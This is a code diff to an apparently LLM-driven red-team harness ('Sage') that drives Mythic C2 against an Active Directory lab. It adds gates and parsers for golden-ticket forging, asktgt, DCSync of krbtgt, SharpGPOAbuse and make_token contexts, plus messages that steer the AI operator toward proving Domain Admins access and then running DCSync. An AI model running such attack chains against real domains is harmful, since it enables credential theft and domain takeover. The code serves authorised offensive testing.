@@ -1,9 +1,11 @@
 import os
+from dataclasses import asdict, is_dataclass
 ENGAGEMENT_GATE_ENABLED = os.environ.get("SAGE_ENGAGEMENT_GATE", "").lower() in ("1", "true", "yes")
 # Durable cross-run engagement ledger config. The achieved-hops ledger is maintained incrementally in
 # code (zero LLM inference); these knobs let it survive across runs/restarts as a per-engagement JSON.
 # Key per-ENGAGEMENT (broader than the per-solve ParentTaskID/agent_task_id) so separate solves resume.
 SAGE_ENGAGEMENT_ID = os.environ.get("SAGE_ENGAGEMENT_ID", "").strip() or "default"
+SAGE_ENGAGEMENT_OBJECTIVE = os.environ.get("SAGE_ENGAGEMENT_OBJECTIVE", "").strip()
 # Durable-hop TTL (hours). A loaded "achieved" hop older than this is dropped at load so a stale belief
 # (e.g. after a GOAD redeploy) cannot suppress a real hop. Default 0 = disabled (no expiry). The gate
 # also refuses to SILENTLY hard-SKIP a durable hop unless live footholds corroborate it — TTL is the
@@ -13,6 +15,44 @@ def _engagement_hop_ttl_hours() -> float:
         return float(os.environ.get("SAGE_ENGAGEMENT_HOP_TTL_HOURS", "0") or 0)
     except (ValueError, TypeError):
         return 0.0
+
+
+def _looks_like_bloodhound_collection_zip(content: bytes) -> bool:
+    if not isinstance(content, (bytes, bytearray)) or len(content) < 128:
+        return False
+    try:
+        import io
+        import zipfile
+        with zipfile.ZipFile(io.BytesIO(content)) as archive:
+            names = [name for name in archive.namelist() if not name.endswith("/")]
+    except Exception:
+        return False
+    return any(name.lower().endswith(".json") for name in names)
+
+
+def _graph_facts_missing_credential_domains(graph_facts, credential_domains) -> bool:
+    domains = {
+        str(domain or "").strip().casefold()
+        for domain in credential_domains or []
+        if str(domain or "").strip()
+    }
+    if not domains:
+        return False
+    covered: set[str] = set()
+    for graph_fact in graph_facts or []:
+        predicate = str(getattr(graph_fact, "predicate", "") or "").casefold()
+        if predicate.startswith("credential-target:") and "@" in predicate:
+            covered.add(predicate.rsplit("@", 1)[1].strip())
+            continue
+        marker = "account_domain="
+        if marker in predicate:
+            tail = predicate.split(marker, 1)[1]
+            domain = tail.split(";", 1)[0].strip()
+            if domain:
+                covered.add(domain)
+    return bool(domains - covered)
+
+
 import json
 import re as _re_mod
 from pathlib import Path
@@ -37,8 +77,10 @@ def _engagement_ledger_file(engagement_id: str | None = None) -> str:
     """Absolute path to the JSON ledger for an engagement key (delegated to the shared module)."""
     return _engagement_ledger_mod().ledger_path(engagement_id or SAGE_ENGAGEMENT_ID)
 import asyncio
+import ast
 import base64
 from datetime import datetime, timezone
+import hashlib
 import re
 from typing import Annotated, List, Dict, TypedDict
 from mythic import mythic, mythic_classes
@@ -111,6 +153,89 @@ _READ_FAILURE_SIGNATURES = _TASK_FAILURE_SIGNATURES + (
     "unexpected error",
     "traceback (most recent call last)",
 )
+
+# Recording-gate signatures: BROADER than the breaker, used ONLY to decide whether a no-probe (legacy)
+# technique may record `achieved`. Includes Mythic/agent INFRASTRUCTURE errors — a task that errored at
+# CREATION ("error: creating task"), a .NET assembly that was never registered ("no assembly by that name"),
+# an unknown callback/payload — plus tracebacks and the breaker set. These are produced by Mythic/the agent,
+# NOT the target, so they are a trustworthy "this task did not run/succeed" signal. (2026-06-12: SharpGPOAbuse
+# errored "no assembly by that name" at task creation; the narrow breaker missed it, so gpo-abuse recorded
+# achieved off a task that never ran.)
+_RECORD_FAILURE_SIGNATURES = _READ_FAILURE_SIGNATURES + (
+    "no assembly by that name",
+    "error: creating task",
+    "no callback by that name",
+    "no payload by that name",
+    "error: command not found",
+)
+
+
+def _record_output_is_failure(output: str) -> bool:
+    """True when task output shows the task did NOT cleanly succeed: empty/whitespace output, or a Mythic/agent
+    infrastructure error / traceback / known agent-side failure. Gates the LEGACY no-probe recording path so a
+    no-artifact technique (e.g. gpo-abuse) never records `achieved` off a failed or empty task. Intentionally
+    broad: for a no-probe hop, under-recording (a retry) is far safer than a false-achieved that corrupts the solve."""
+    if not output or not str(output).strip():
+        return True
+    low = str(output).lower()
+    return any(sig in low for sig in _RECORD_FAILURE_SIGNATURES)
+
+
+def _gpo_abuse_guid_only_noop(output: str) -> bool:
+    """SharpGPOAbuse can print only discovery lines (Domain/DC/DN/GUID) when it does not apply a change.
+    Treat that as a no-op: there is no new artifact to wait on and no effect proof to record."""
+    text = str(output or "")
+    if not text.strip():
+        return False
+    low = text.casefold()
+    discovery_markers = (
+        "[+] domain =",
+        "[+] domain controller =",
+        "[+] distinguished name =",
+        "[+] guid of",
+    )
+    if not any(marker in low for marker in discovery_markers):
+        return False
+    if "[sage result] invalid parameters/no-op" in low:
+        return True
+    success_markers = (
+        "gpo was modified",
+        "modified to include",
+        "scheduled task was created",
+        "successfully added",
+        "versionnumber attribute changed",
+        "version number attribute changed",
+        "scheduledtasks.xml",
+        "immediate scheduled task",
+        "immediate task",
+    )
+    return not any(marker in low for marker in success_markers)
+
+
+def _gpo_abuse_setup_needs_proof(output: str) -> bool:
+    """True when SharpGPOAbuse appears to have written the GPO setup artifact, but no SYSTEM/effect proof is present."""
+    text = str(output or "")
+    if not text.strip() or _record_output_is_failure(text) or _gpo_abuse_guid_only_noop(text):
+        return False
+    low = text.casefold()
+    if "[sage result] gpo setup pending" in low:
+        return True
+    setup_markers = (
+        "gpo was modified",
+        "modified to include",
+        "scheduled task was created",
+        "versionnumber attribute changed",
+        "version number attribute changed",
+        "gpt.ini was increased",
+        "scheduledtasks.xml",
+        "wait for the gpo refresh cycle",
+    )
+    proof_markers = (
+        "nt authority\\system",
+        "system execution proven",
+        "domain admins enabled group",
+    )
+    return any(marker in low for marker in setup_markers) and not any(marker in low for marker in proof_markers)
 
 
 _CALLBACK_LIVENESS_QUERY = """
@@ -434,6 +559,119 @@ def _is_task_failure_output(output: str) -> bool:
     return any(sig in low for sig in _TASK_FAILURE_SIGNATURES)
 
 
+def _contains_identity_token(haystack: str, needle: str) -> bool:
+    candidate = str(needle or "").strip().casefold()
+    if not candidate:
+        return False
+    text = str(haystack or "").casefold()
+    if "\\" in candidate:
+        return candidate in text
+    try:
+        return re.search(rf"(?<![a-z0-9_.-]){re.escape(candidate)}(?![a-z0-9_.-])", text) is not None
+    except Exception:
+        return candidate in text
+
+
+def _normalize_command_name(command: str) -> str:
+    return str(command or "").strip().casefold().replace("-", "_")
+
+
+def _ticket_command_key(command: str, parameters) -> str:
+    """Stable key for a builder-shaped Kerberos ticket forge command.
+
+    The gate intentionally keys on exact commands emitted by the deterministic capability builder, not on a
+    particular tool. That lets the adapter choose the lowest-footprint backend while still blocking prompt-built
+    ticket forges that caused false ledger entries.
+    """
+    command_name = _normalize_command_name(command)
+    values = parameters
+    if isinstance(parameters, str):
+        stripped = parameters.strip()
+        if stripped.startswith("{") and stripped.endswith("}"):
+            try:
+                values = json.loads(stripped)
+            except Exception:
+                return ""
+        else:
+            return ""
+    if not isinstance(values, dict):
+        return ""
+    if command_name == "mimikatz":
+        for text in _command_argument_candidates(values, ("commands", "arguments", "argument", "args", "commandline")):
+            if text.startswith("kerberos::golden") and "/domain:" in text and "/sid:" in text:
+                return f"kerberos-forge:mimikatz:{text}"
+    if command_name in {
+        "execute_assembly",
+        "inline_assembly",
+        "load_assembly",
+        "invoke_assembly",
+        "assembly_inject",
+    }:
+        for text in _command_argument_candidates(values, (
+            "assembly_arguments",
+            "arguments",
+            "argument",
+            "args",
+            "commandline",
+            "params",
+        )):
+            if text.startswith("golden ") and "/domain:" in text and "/sid:" in text:
+                return f"kerberos-forge:managed-assembly:{text}"
+            if (
+                text.startswith("asktgt ")
+                and "/domain:" in text
+                and "/user:" in text
+                and any(flag in text for flag in ("/aes256:", "/aes128:", "/rc4:", "/ntlm:"))
+            ):
+                return f"kerberos-tgt:managed-assembly:{text}"
+            if (
+                text.startswith("asktgt ")
+                and "/domain:" in text
+                and "/user:" in text
+                and "/certificate:" in text
+            ):
+                return f"kerberos-pkinit:managed-assembly:{text}"
+    return ""
+
+
+def _is_deterministic_ticket_command(command: str, parameters) -> bool:
+    """True for a syntactically builder-shaped ticket command."""
+    return bool(_ticket_command_key(command, parameters))
+
+
+def _capability_command_key(command: str, parameters) -> str:
+    command_name = _capability_command_name(command)
+    try:
+        if isinstance(parameters, str):
+            params_key = parameters
+        else:
+            params_key = json.dumps(parameters, sort_keys=True, default=str)
+    except Exception:
+        params_key = str(parameters)
+    return f"{command_name}:{params_key}"
+
+
+def _capability_command_name(command: str) -> str:
+    normalized = _normalize_command_name(command)
+    if normalized in {"shell", "run"}:
+        return "shell"
+    return normalized
+
+
+def _command_argument_candidates(values: dict, keys: tuple[str, ...]) -> list[str]:
+    candidates: list[str] = []
+    key_set = {str(key or "").strip().casefold() for key in keys}
+    for existing_key, value in values.items():
+        if str(existing_key or "").strip().casefold() not in key_set:
+            continue
+        raw_candidates = value if isinstance(value, list) else [value]
+        for candidate in raw_candidates:
+            text = " ".join(str(candidate or "").strip().casefold().split())
+            if text:
+                candidates.append(text)
+    return candidates
+
+
 def _is_failed_read_output(output: str) -> bool:
     """True if task output looks like a (re-read) failure — broader than the breaker scope. Used only
     by the get_all_task_output_by_task_id no-progress clamp."""
@@ -451,6 +689,8 @@ def _is_failed_read_output(output: str) -> bool:
 GUARDED_TOOLS: set[str] = {
     "issue_task_and_waitfor_task_output",
     "upload_file_by_file_uuid",
+    "materialize_capability_inputs",
+    "execute_capability",
     "create_payload",
     "delete_payload",
     "download_tool",
@@ -507,7 +747,12 @@ class MythicTools:
         self._last_issued_task_display_id = None
         self._last_issued_callback_id = None
         self._engagement_hops: list = []
+        self._engagement_objective_text: str = ""
         self._pending_engagement_hop = None
+        # Assembly filenames already checked against Mythic filemeta in this Sage process. Apollo's
+        # execute_assembly/inline_assembly can lazily fetch bytes by assembly_id; no hidden register_assembly
+        # task is required for those commands once the file exists in Mythic.
+        self._assembly_file_checks: set[str] = set()
         # Forward-planner graph facts: BloodHound ACL edges (GenericWrite on GPOs, WriteDacl on domains,
         # etc.) projected into engagement predicates, cached here and refreshed after each verified ingest
         # so the per-turn injection can DIRECT the operator to the next available hop instead of letting it
@@ -516,14 +761,34 @@ class MythicTools:
         # hop (suggest-on-known; blocking stays conservative / unknown != false).
         self._engagement_graph_facts: list = []
         self._engagement_graph_facts_ts: str | None = None
+        # Exact per-process Kerberos ticket forge command strings emitted by build_capability_commands. The
+        # gate requires golden-ticket/SID-history tasks to match one of these keys so a model cannot handcraft
+        # a command that merely looks builder-shaped or bypasses the isolated-context sequence.
+        self._deterministic_ticket_command_keys: set[str] = set()
+        self._deterministic_ticket_command_contexts: dict[str, dict] = {}
+        self._deterministic_capability_command_contexts: dict[str, dict] = {}
+        # Runtime artifacts from deterministic Kerberos capability plans. The model should not have to copy
+        # long Rubeus ticket blobs between tools; cache them once and bind them into ticket_store_add.
+        self._capability_artifacts: dict[str, str] = {}
+        # NetOnly/sacrificial contexts created during this Sage task, keyed by callback + remote identity.
+        # Prevents repeated make_token calls for the same EA/DA context when ticket_store_list/proof should
+        # be used first.
+        self._kerberos_logon_context_keys: set[tuple] = set()
+        self._kerberos_account_context_keys: set[tuple] = set()
+        # Per-callback Kerberos context epoch. Service-access probes depend on the current logon/session
+        # ticket state, so an Access Denied before make_token/ticket import must not poison the identical
+        # proof command after the context changes.
+        self._kerberos_context_epochs: dict[str, int] = {}
         # Empirical pre-DCSync rights precheck: per-(technique,domain) count of times we've blocked a DCSync
         # for missing replication rights. CAPPED (see _DCSYNC_PRECHECK_MAX_BLOCKS) so the precheck can redirect
         # the agent to obtain rights first WITHOUT ever becoming a permanent deadlock (the failure mode that
         # got the static gate demoted to advisory).
         self._dcsync_precheck_blocks: dict = {}
-        # Access-context keys with a collection currently in-flight (issued, not yet ingested). Gates the
-        # parallel-spawn case (agent fires N SharpHounds before the first ingests) until graph-built lands.
-        self._collection_in_flight: set = set()
+        # Access-context keys with a collection currently in-flight (issued, not yet ingested). A marker is
+        # valid only when backed by a real Mythic task display_id. The gate may classify intent, but only the
+        # post-issue path can commit operational transient state.
+        self._collection_in_flight: dict[str, dict] = {}
+        self._pending_task_backed_transition: dict | None = None
         # Deliberation-drain guards. Command schemas are STATIC per payloadtype -> cache (a 2026-06-09 solve
         # re-fetched + re-dumped them 27×, bloating context). Gate-block counts cap a hop the gate keeps
         # DEFERring (issue_task fired 168× -> 1 task that run): a firm STOP after repeated blocks with no
@@ -535,6 +800,7 @@ class MythicTools:
         # neither path re-queries Mythic repeatedly.
         self._cred_cache: list | None = None
         self._cred_cache_ts: str | None = None
+        self._domain_sid_cache: dict[str, str] = {}
         # The durable-ledger key. Defaults to the explicit SAGE_ENGAGEMENT_ID (env/test override); when
         # that is unset ("default") it is resolved lazily from the current Mythic OPERATION the first time
         # the gate fires (client exists by then) -> `state_<OperationName>_<OperationId>.json`. The lock
@@ -545,12 +811,13 @@ class MythicTools:
         # Live footholds cache (populated by the gate after reconcile) so the per-turn state render in
         # model.py can show footholds without an extra network round-trip on every model call.
         self._engagement_footholds: list = []
-        # Durable cross-run resume: load the per-engagement hop ledger from disk so a fresh MythicTools
-        # (rebuilt per solve) inherits already-achieved hops across runs/restarts. Gate-on only; never
-        # raises (fail-open to an empty ledger). With the gate off we never touch disk.
-        if ENGAGEMENT_GATE_ENABLED:
+        # Durable cross-run resume: when an explicit engagement key is configured, load it now. The normal
+        # operation-named key needs a Mythic client, so it is resolved after login; loading state_default here
+        # would let stale default state drive planning before the first gated task.
+        if ENGAGEMENT_GATE_ENABLED and SAGE_ENGAGEMENT_ID and SAGE_ENGAGEMENT_ID != "default":
+            self._engagement_key = SAGE_ENGAGEMENT_ID
             try:
-                self._load_engagement_ledger()
+                self._load_engagement_ledger(replace=True)
             except Exception:
                 pass
         # No-progress guard: count how many times each task_id has been fetched and come back FAILED
@@ -606,6 +873,21 @@ class MythicTools:
                         description=method.__doc__ or f"Execute {method_name}"
                     ))
         return tools
+
+    async def wait_for_seconds(self, seconds: int, reason: str = "") -> str:
+        """
+        Pause Sage-side LLM execution for a bounded number of seconds, without tasking or changing any Mythic
+        callback sleep interval. Use this when an external effect needs propagation time before a verifier can
+        be meaningful, such as waiting for a Group Policy refresh before polling domain group membership.
+        """
+        try:
+            wait_seconds = int(seconds)
+        except (TypeError, ValueError):
+            wait_seconds = 1
+        wait_seconds = max(1, min(wait_seconds, 600))
+        await asyncio.sleep(wait_seconds)
+        suffix = f" reason={reason}" if reason else ""
+        return f"waited {wait_seconds} seconds{suffix}"
 
     async def get_all_active_callbacks(self) -> str:
 
@@ -702,7 +984,7 @@ class MythicTools:
         # HITL: free
         query = """
             query PayloadInfo {
-                payloadtype(where: { name: { _neq: "sage" } }) {
+                payloadtype {
                     agent_type
                     name
                     supported_os
@@ -740,7 +1022,7 @@ class MythicTools:
         # HITL: free
         query = """
             query SagePayloadNames {
-                payloadtype(where: { name: { _neq: "sage" } }) {
+                payloadtype {
                     name
                 }
             }
@@ -1372,6 +1654,228 @@ class MythicTools:
             self._task_failure_counts[fail_key] = attempts + 1
         return decision
 
+    def _cache_kerberos_ticket_artifact(self, command: str, parameters, output: str) -> None:
+        try:
+            if _normalize_command_name(command) not in {"execute_assembly", "execute-assembly", "inline_assembly"}:
+                return
+            if isinstance(parameters, dict):
+                rendered = " ".join(str(value) for value in parameters.values())
+            else:
+                rendered = str(parameters or "")
+            if "golden" not in rendered.casefold() and "base64(ticket.kirbi)" not in str(output).casefold():
+                return
+            ticket = self._extract_kerberos_ticket_base64(output)
+            if ticket:
+                self._capability_artifacts["kerberos_ticket_base64"] = ticket
+        except Exception:
+            return
+
+    def _bind_kerberos_ticket_artifact(self, command: str, parameters):
+        try:
+            if _normalize_command_name(command) != "ticket_store_add" or not isinstance(parameters, dict):
+                return parameters
+            cached = self._capability_artifacts.get("kerberos_ticket_base64")
+            if not cached:
+                return parameters
+            out = dict(parameters)
+            candidate_key = ""
+            for key in ("base64ticket", "base64Ticket", "ticket", "ticket_base64", "credential"):
+                if key in out:
+                    candidate_key = key
+                    break
+            if not candidate_key:
+                candidate_key = "base64ticket"
+            current = str(out.get(candidate_key) or "")
+            if not self._is_valid_base64_blob(current):
+                out[candidate_key] = cached
+                existing = out.get("existingTicket")
+                if isinstance(existing, dict):
+                    existing = dict(existing)
+                    existing["credential"] = cached
+                    out["existingTicket"] = existing
+            return out
+        except Exception:
+            return parameters
+
+    def _extract_kerberos_ticket_base64(self, output) -> str:
+        if isinstance(output, bytes):
+            text = output.decode("utf-8", "replace")
+        else:
+            text = "" if output is None else str(output)
+            stripped = text.strip()
+            if len(stripped) >= 3 and stripped[0] == "b" and stripped[1] in {"'", '"'}:
+                try:
+                    decoded = ast.literal_eval(stripped)
+                    if isinstance(decoded, bytes):
+                        text = decoded.decode("utf-8", "replace")
+                except Exception:
+                    pass
+        text = (
+            text
+            .replace("\\r\\n", "\n")
+            .replace("\\n", "\n")
+            .replace("\\r", "\n")
+            .replace("\\t", "\t")
+        )
+        match = re.search(r"base64\(ticket\.kirbi\)\s*:\s*(?P<body>.+)", text, flags=re.I | re.S)
+        if not match:
+            return ""
+        lines = []
+        for line in match.group("body").splitlines():
+            stripped = line.strip().strip('"').strip("'")
+            if not stripped:
+                if lines:
+                    break
+                continue
+            if re.search(r"^\[|^\(|^SAGE OPSEC|^🛠️|^🔧", stripped):
+                break
+            if re.fullmatch(r"[A-Za-z0-9+/=\\/\s]+", stripped):
+                lines.append(stripped)
+                continue
+            if lines:
+                break
+        candidate = re.sub(r"\s+", "", "".join(lines)).replace("\\/", "/")
+        return candidate if self._is_valid_base64_blob(candidate) else ""
+
+    def _is_valid_base64_blob(self, value: str) -> bool:
+        text = re.sub(r"\s+", "", str(value or "")).replace("\\/", "/")
+        if len(text) < 64:
+            return False
+        try:
+            base64.b64decode(text, validate=True)
+            return True
+        except Exception:
+            return False
+
+    def _kerberos_logon_context_key(self, command: str, callback_display_id: int, parameters) -> tuple | None:
+        try:
+            if _normalize_command_name(command) != "make_token" or not isinstance(parameters, dict):
+                return None
+            credential = parameters.get("Credential") or parameters.get("credential") or {}
+            credential_account = credential.get("account") if isinstance(credential, dict) else ""
+            credential_realm = credential.get("realm") if isinstance(credential, dict) else ""
+            username = self._capability_text(parameters.get("username") or parameters.get("user") or credential_account)
+            realm = self._capability_text(parameters.get("domain") or parameters.get("realm") or credential_realm)
+            if "\\" in username and not realm:
+                realm, _, username = username.partition("\\")
+            if "@" in username and not realm:
+                username, _, realm = username.partition("@")
+            netonly = parameters.get("netOnly", parameters.get("netonly", True))
+            return (
+                int(callback_display_id),
+                realm.casefold(),
+                username.casefold(),
+                bool(netonly),
+            )
+        except Exception:
+            return None
+
+    def _record_kerberos_logon_context(self, command: str, callback_display_id: int, parameters, output: str) -> None:
+        try:
+            normalized = _normalize_command_name(command)
+            if normalized == "rev2self" and "fail" not in str(output).casefold():
+                self._kerberos_logon_context_keys = {
+                    key for key in self._kerberos_logon_context_keys if key[0] != int(callback_display_id)
+                }
+                self._bump_kerberos_context_epoch(callback_display_id)
+                return
+            key = self._kerberos_logon_context_key(command, callback_display_id, parameters)
+            if not key:
+                return
+            low = str(output or "").casefold()
+            if "successfully impersonated" in low or "new claims" in low:
+                if key not in self._kerberos_logon_context_keys:
+                    self._kerberos_logon_context_keys.add(key)
+                    self._bump_kerberos_context_epoch(callback_display_id)
+        except Exception:
+            return
+
+    def _record_kerberos_ticket_store_context(self, command: str, callback_display_id: int, output: str) -> None:
+        try:
+            normalized = _normalize_command_name(command)
+            low = str(output or "").casefold()
+            if any(token in low for token in ("error", "fail", "exception", "invalid", "denied")):
+                return
+            if normalized == "ticket_store_add" and "added ticket" in low:
+                self._bump_kerberos_context_epoch(callback_display_id)
+            elif normalized in {"ticket_store_purge", "ticket_store_remove", "ticket_store_delete"}:
+                self._bump_kerberos_context_epoch(callback_display_id)
+        except Exception:
+            return
+
+    def _kerberos_context_epoch(self, callback_display_id) -> int:
+        return int(getattr(self, "_kerberos_context_epochs", {}).get(str(callback_display_id), 0) or 0)
+
+    def _bump_kerberos_context_epoch(self, callback_display_id) -> None:
+        key = str(callback_display_id)
+        current = self._kerberos_context_epoch(callback_display_id)
+        self._kerberos_context_epochs[key] = current + 1
+
+    def _deterministic_capability_command_context(self, command: str, parameters) -> dict:
+        try:
+            return dict(
+                getattr(self, "_deterministic_capability_command_contexts", {}).get(
+                    _capability_command_key(command, parameters),
+                    {},
+                )
+                or {}
+            )
+        except Exception:
+            return {}
+
+    def _task_failure_key(self, command: str, callback_display_id: int, parameters) -> tuple:
+        try:
+            serialized = (
+                json.dumps(parameters, sort_keys=True)
+                if isinstance(parameters, (dict, list))
+                else str(parameters)
+            )
+        except Exception:
+            serialized = str(parameters)
+        key = (command, callback_display_id, serialized)
+        context = self._deterministic_capability_command_context(command, parameters)
+        capability = self._capability_text(context.get("capability")).casefold()
+        expected_probe = self._capability_text(context.get("expected_probe")).casefold()
+        produces = {self._capability_text(item).casefold() for item in context.get("produces", []) or []}
+        if (
+            expected_probe in {"extract_ticket_probe", "extract_adcs_certificate_auth_probe"}
+            and "kerberos_service_access_probe" in produces
+        ):
+            key = key + ("kerberos_context_epoch", self._kerberos_context_epoch(callback_display_id))
+        return key
+
+    async def _callback_tasking_liveness_blocker(self, callback_display_id: int) -> str:
+        """Return a STOP message when a callback is known not to be taskable."""
+        try:
+            if self.client is None:
+                return ""
+            result = await assess_callback_liveness(self.client, int(callback_display_id))
+            if not isinstance(result, dict):
+                return ""
+            status = self._capability_text(result.get("status")).casefold()
+            reason = self._capability_text(result.get("reason"))
+            # Assessment transport errors should not become a hard tasking veto. Concrete Mythic facts
+            # such as stale last_checkin, missing callback row, or likely-crashed status should.
+            if reason.casefold().startswith("could not assess callback"):
+                return ""
+            stale_status = status in {"dead", "likely_crashed"}
+            missing_or_uncertain = (
+                status == "uncertain"
+                and (
+                    "not found" in reason.casefold()
+                    or "no usable last_checkin" in reason.casefold()
+                )
+            )
+            if not (stale_status or missing_or_uncertain):
+                return ""
+            return (
+                f"STOP — callback {callback_display_id} is not taskable: {status or 'unknown'}; {reason}. "
+                "Do not issue more tasks to this callback. Use list_callbacks/check_callback_alive to select "
+                "a live callback, or obtain a new callback if the payload was killed."
+            )
+        except Exception:
+            return ""
+
     def _format_task_stop(
         self,
         fail_key,
@@ -1428,6 +1932,13 @@ class MythicTools:
         Returns:
             str: Command output (binary output coerced to string).
         """
+        self._pending_task_backed_transition = None
+        # Deterministically normalize a dcsync target /user to NETBIOS\sAMAccountName (NORTH\krbtgt) no matter
+        # how the agent built the command — the bare/FQDN/DN forms cause CrackNames ERROR_NOT_UNIQUE / BAD_DN.
+        try:
+            parameters = self._qualify_dcsync_params(command, parameters)
+        except Exception:
+            pass  # fail-open: never block the issue path on normalization
         if ENGAGEMENT_GATE_ENABLED:
             try:
                 _gate_result = await self._engagement_gate(command, parameters, callback_display_id)
@@ -1455,7 +1966,13 @@ class MythicTools:
                         )
                 except Exception:
                     pass
+                self._pending_task_backed_transition = None
                 return _gate_result
+
+        liveness_blocker = await self._callback_tasking_liveness_blocker(callback_display_id)
+        if liveness_blocker:
+            self._pending_task_backed_transition = None
+            return liveness_blocker
 
         # A command is about to be issued → new state will exist → start a fresh recon epoch so a single
         # legitimate post-action re-read of history/callbacks is allowed again (the guard only fires on
@@ -1493,16 +2010,23 @@ class MythicTools:
                 except (ValueError, TypeError):
                     pass
 
+        # Apollo `run` executes a native binary. Shell builtins/chains (`dir`, `&&`, `cmd.exe /c ...`) must go
+        # through `shell`; otherwise Mythic starts a process named "dir" or sends a literal JSON object to cmd.
+        try:
+            command, parameters = self._rewrite_shell_like_run(command, parameters)
+        except Exception:
+            pass
+        raw_gpo_blocker = self._raw_gpo_mutation_blocker(command, parameters)
+        if raw_gpo_blocker:
+            self._pending_task_backed_transition = None
+            return raw_gpo_blocker
+
         # Circuit breaker: refuse to re-issue a command that has already failed repeatedly
         # with the same (normalized) parameters on the same callback. Without this, a
         # transient "Failed to create task" or a parse error sends the model into an
         # unbounded retry loop (cosmetic param permutations) that explodes context and
         # exhausts the recursion limit.
-        fail_key = (
-            command,
-            callback_display_id,
-            json.dumps(parameters, sort_keys=True) if isinstance(parameters, (dict, list)) else str(parameters),
-        )
+        fail_key = self._task_failure_key(command, callback_display_id, parameters)
         if self._task_failure_counts.get(fail_key, 0) >= 2:
             return (
                 f"STOP — command '{command}' on callback {callback_display_id} with these parameters has already "
@@ -1527,11 +2051,7 @@ class MythicTools:
                                 f"🛡️ ARGRES command={command} group={resolved.group} "
                                 f"params={sorted(parameters.keys())} notes={resolved.notes}"
                             )
-                            fail_key = (
-                                command,
-                                callback_display_id,
-                                json.dumps(parameters, sort_keys=True),
-                            )
+                            fail_key = self._task_failure_key(command, callback_display_id, parameters)
                             if self._task_failure_counts.get(fail_key, 0) >= 2:
                                 return (
                                     f"STOP — command '{command}' on callback {callback_display_id} with these parameters has already "
@@ -1573,12 +2093,39 @@ class MythicTools:
                     )
                 return _validation_error
 
+        parameters = self._bind_kerberos_ticket_artifact(command, parameters)
+        fail_key = self._task_failure_key(command, callback_display_id, parameters)
+        if self._task_failure_counts.get(fail_key, 0) >= 2:
+            return (
+                f"STOP — command '{command}' on callback {callback_display_id} with these parameters has already "
+                f"failed {self._task_failure_counts[fail_key]} times. Do NOT re-issue it with cosmetically different "
+                f"empty parameters ({{}}, '', '\"\"' are all equivalent to 'no arguments'). The parameter format is "
+                f"likely wrong or the failure is environmental. Report this to the operator, consult "
+                f"get_all_commands_for_payloadtype for the correct parameter schema, or choose a different approach."
+            )
+
+        logon_context_key = self._kerberos_logon_context_key(command, callback_display_id, parameters)
+        if logon_context_key and logon_context_key in self._kerberos_logon_context_keys:
+            return (
+                "STOP — a matching NetOnly Kerberos logon context was already created on this callback "
+                f"for {logon_context_key[2]}@{logon_context_key[1]}. Do not create another one. "
+                "Validate/reuse the existing context with ticket_store_list and the context-bound service "
+                "proof, or run rev2self first if you intentionally need to abandon the current context."
+            )
+
         _fp = await self._action_footprint(command, parameters, callback_display_id)
         self._ledger_record(command, callback_display_id, parameters, _fp)
 
         try:
             if self.client is None:
                 raise Exception("MythicAPIClient not initialized. Call create() first.")
+            # D1: by-name assembly execution needs Mythic filemeta so create_go_tasking can resolve
+            # assembly_name -> assembly_id. Apollo fetches/caches the bytes lazily during execute_assembly,
+            # so do NOT issue a hidden register_assembly task here.
+            try:
+                await self._ensure_assembly_file_available(command, parameters, callback_display_id)
+            except Exception:
+                pass
             logger.debug(f"🛠️ Calling issue_task_and_waitfor_task_output tool for command: {command} on callback_display_id: {callback_display_id}")
             # The Mythic lib's own `timeout` does not reliably fire — its waitfor subscription can
             # block indefinitely when a task never reaches a terminal state (the documented
@@ -1594,12 +2141,13 @@ class MythicTools:
                 async def _issue_and_wait():
                     task = await mythic.issue_task(
                         mythic=self.client, command_name=command, parameters=parameters,
-                        callback_display_id=callback_display_id, wait_for_complete=True, timeout=timeout,
+                        callback_display_id=callback_display_id, wait_for_complete=False, timeout=timeout,
                     )  # token_id=token_id
                     tdid = task.get("display_id") if isinstance(task, dict) else None
                     if tdid is None:
                         raise Exception("Failed to create task")
                     self._last_issued_task_display_id = tdid
+                    self._commit_task_backed_transition(command, parameters, callback_display_id, tdid)
                     return await mythic.waitfor_for_task_output(
                         mythic=self.client, task_display_id=tdid, timeout=timeout,
                     )
@@ -1636,6 +2184,37 @@ class MythicTools:
                     )
                 return "No results returned from task."
             results_str = str(results)
+            if (
+                getattr(self, "_pending_engagement_hop", None)
+                and self._pending_engagement_hop[0] == "gpo-abuse"
+                and _gpo_abuse_guid_only_noop(results_str)
+            ):
+                results_str += (
+                    "\n\n[SAGE RESULT] invalid parameters/no-op: SharpGPOAbuse only resolved the domain/DC/GPO "
+                    "GUID and did not report any GPO modification, ScheduledTasks.xml write, version bump, or "
+                    "success marker. Do NOT wait for Group Policy refresh on this output. Treat this attempt as "
+                    "failed/no-op; rebuild this capability with build_capability_commands inputs "
+                    "{\"method\":\"gpp-immediate-task-fallback\", \"gpo_guid\":\"<GUID from this output>\"} "
+                    "to emit deterministic GPP XML/CSE/version repair plus proof-read commands, or choose a "
+                    "different action."
+                )
+            elif (
+                getattr(self, "_pending_engagement_hop", None)
+                and self._pending_engagement_hop[0] == "gpo-abuse"
+                and _gpo_abuse_setup_needs_proof(results_str)
+            ):
+                results_str += (
+                    "\n\n[SAGE RESULT] GPO setup pending: SharpGPOAbuse modified the GPO setup artifact, "
+                    "but this is not SYSTEM execution proof. Do NOT stop, mark the capability complete, or "
+                    "DCSync yet. Wait for Group Policy to apply with wait_for_seconds (300 seconds by default "
+                    "for a DC-scoped policy), then run an explicit effect proof such as the requested proof-file "
+                    "read or `net group \"Domain Admins\" /domain`. If this was a deterministic fallback plan, "
+                    "continue issuing the returned gpupdate/proof-read commands in order."
+                )
+            self._cache_kerberos_ticket_artifact(command, parameters, results_str)
+            self._record_kerberos_logon_context(command, callback_display_id, parameters, results_str)
+            self._record_kerberos_ticket_store_context(command, callback_display_id, results_str)
+            self._record_deterministic_capability_command_result(command, parameters, callback_display_id, results_str)
             # Agent-side execution errors come back in the OUTPUT (not as exceptions); count
             # them toward the circuit breaker so blind retries are still capped.
             result_class = command_builder.classify_result(command, results_str)
@@ -1699,6 +2278,10 @@ class MythicTools:
                     self._record_engagement_success(results_str)
                 except Exception:
                     pass  # fail-open: recording must never break the issue path
+                try:
+                    self._apply_contradiction_downgrade(command, parameters, results_str)
+                except Exception:
+                    pass  # fail-open: a downgrade must never break the issue path
             return results_str
         except Exception as e:
             error_result = f"Error issuing command '{command}' to agent {callback_display_id}: {e}"
@@ -1727,6 +2310,15 @@ class MythicTools:
             return None
 
         classified = intent_classifier.classify_tool_call(command, parameters)
+        ticket_key = _ticket_command_key(command, parameters)
